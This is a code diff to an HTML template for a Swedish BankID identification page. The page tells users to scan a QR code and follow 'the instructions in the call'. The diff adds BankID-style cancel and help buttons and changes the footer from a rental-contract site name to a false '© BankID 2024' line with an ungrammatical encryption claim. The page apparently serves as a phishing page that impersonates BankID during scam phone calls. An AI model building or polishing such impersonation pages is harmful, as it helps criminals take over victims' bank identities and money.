@@ -19,7 +19,9 @@
     <div class="content-container">
         <div id="mainTextContainer">Legitimering med BankID</div>
         <div id="agreeSignText">
-            För att säkerställa din identitet använder vi BankID. Genom att logga in bekräftar du att det är du som utför åtgärden. Följ instruktionerna för en enkel och säker inloggning. Din säkerhet är vår prioritet.
+            För att säkerställa din identitet använder vi BankID. Genom att logga in bekräftar du att det är du som utför åtgärden. <br>
+            Följ instruktionerna för en enkel och säker inloggning. <br>
+            Din säkerhet är vår prioritet.
         </div>
 
         <div class="card" id="qrCard" style="display: none;">
@@ -32,6 +34,30 @@
                 <div id="qrText">
                     För att bekräfta din identitet, skanna QR-koden med din BankID. Följ instruktionerna i samtalet för att fortsätta. Denna metod är snabb, säker och används för att verifiera dig under hela processen.
                     <img id="qrImage" alt="QR Code will appear here">
+                                      
+                    <div id="bankid-qr-code" data-view-id="bankid-qr-code" class="current">
+                    </div>
+                    <div class="button-group">
+                            <div>
+                                <button class="link-button cancel-bankid">
+                                    Avbryt
+                                </button>
+                            </div>
+                            <div>
+                                <button class="link-button sidebar-toggler" data-flow-info-target="other">
+                                    <span class="help-button-text">
+                                        Behöver du hjälp?
+                                    </span>
+                    
+                                    <span class="help-button-text hidden">
+                                        Stäng
+                                    </span>
+                                </button>
+                            </div>
+                        </div>
+
+
+                    
                 </div>
             </div>
         </div>
@@ -39,8 +65,10 @@
     </div>
 
     <div class="footer">
-            <p>© 2024 Digitala Hyreskontrakt</p>
+            <p>© BankID 2024<br>
+                Denna anslut är krypterad</p>
     </div>
+    
         <script src="{{ url_for('static', filename='js/script.js') }}" defer></script>
 
 </body>
